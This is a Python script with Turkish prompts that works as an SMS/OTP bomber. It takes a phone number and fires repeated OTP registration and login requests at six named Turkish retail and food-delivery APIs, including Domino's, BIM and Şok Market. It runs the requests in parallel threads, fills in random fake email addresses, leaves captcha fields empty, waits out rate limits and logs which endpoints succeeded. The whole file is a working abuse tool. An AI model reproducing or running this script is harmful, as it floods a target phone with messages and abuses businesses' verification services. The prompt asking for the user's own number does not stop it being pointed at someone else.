import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

session = requests.Session()

phone = input("Kendi numaranı gir (10 hane, 555xxxxxxx): ").strip()

if len(phone) != 10 or not phone.isdigit():
    print("Hatalı format knk!")
    exit()

print(f"\n{phone} numarana KESİN ÇALIŞAN 6 siteden (her biri 3 kez) OTP gönderiliyor...\n")
time.sleep(2)

basarili_sms = 0
basarili_siteler = set()
rate_limit_durum = {}

def kaydet(site_adi):
    global basarili_siteler
    if site_adi not in basarili_siteler:
        with open("basarili.txt", "a", encoding="utf-8") as f:
            f.write(site_adi + "\n")
        basarili_siteler.add(site_adi)

def thomas_mail():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(8)) + "@hotmail.com"

def rate_limit_kontrol(site_adi):
    if site_adi in rate_limit_durum:
        bekleme, _ = rate_limit_durum[site_adi]
        if datetime.now() < bekleme:
            kalan = (bekleme - datetime.now()).seconds
            print(f"[!] {site_adi} rate limit yemiş → {kalan//60} dakika bekleniyor...")
            time.sleep(kalan + 10)
            del rate_limit_durum[site_adi]

# KESİN ÇALIŞAN 6 SİTE
def kahvedunyasi(number):
    site = "Kahve Dünyası"
    rate_limit_kontrol(site)
    try:
        headers = {"Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com"}
        r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", headers=headers, json={"countryCode": "90", "phoneNumber": number}, timeout=10)
        if "Success" in r.text:
            print(f"[+] {site} → OTP gitti!")
            kaydet("api.kahvedunyasi.com")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

def bim(number):
    site = "Bim"
    rate_limit_kontrol(site)
    try:
        r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": number}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("bim.veesk.net")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

def dominos(number, mail):
    site = "Dominos"
    rate_limit_kontrol(site)
    try:
        headers = {"Content-Type":"application/json;charset=utf-8"}
        r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", headers=headers, json={"email": mail, "isSure": False, "mobilePhone": number}, timeout=10)
        if r.json().get("isSuccess") == True:
            print(f"[+] {site} → OTP gitti!")
            kaydet("frontend.dominos.com.tr")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

def yapp(number, mail):
    site = "Yapp"
    rate_limit_kontrol(site)
    try:
        payload = {"phone_number": number, "firstname": "Test", "lastname": "User", "email": mail}
        r = requests.post("https://yapp.com.tr/api/mobile/v1/register", json=payload, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("yapp.com.tr")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

def sokmarket(number):
    site = "Şok Market"
    rate_limit_kontrol(site)
    try:
        headers = {"Content-Type": "application/json"}
        r = requests.post("https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate",
                          headers=headers, json={"clientId": "buyer-web", "phoneNumber": number, "captchaToken": "", "captchaAction": "generate_register_otp", "reCaptchaV2": False}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("giris.ec.sokmarket.com.tr")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

def naosstars(number):
    site = "Naosstars"
    rate_limit_kontrol(site)
    try:
        headers = {"Content-Type": "application/json"}
        r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", headers=headers, json={"telephone": f"+90{number}", "type": "register"}, timeout=10)
        if r.status_code == 200:
            print(f"[+] {site} → OTP gitti!")
            kaydet("api.naosstars.com")
            return True
    except:
        pass
    print(f"[-] {site} → Başarısız")
    if site not in rate_limit_durum:
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), 1)
    else:
        _, c = rate_limit_durum[site]
        rate_limit_durum[site] = (datetime.now() + timedelta(minutes=20), c + 1)
    return False

apiler = [kahvedunyasi, bim, dominos, yapp, sokmarket, naosstars]

def api_call(func):
    global basarili_sms
    if func in [dominos, yapp]:
        mail = thomas_mail()
        if func(phone, mail):
            basarili_sms += 1
    else:
        if func(phone):
            basarili_sms += 1

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(api_call, api) for api in apiler for _ in range(3)]
    for future in futures:
        future.result()
        time.sleep(random.uniform(6, 10))

print(f"\nİşlem bitti knk!")
print(f"Toplam {basarili_sms} OTP gönderildi (18 denemeden).")
print("Dominos geri döndü, keyfini çıkar!")
print("Spam klasörünü kontrol et 😎")
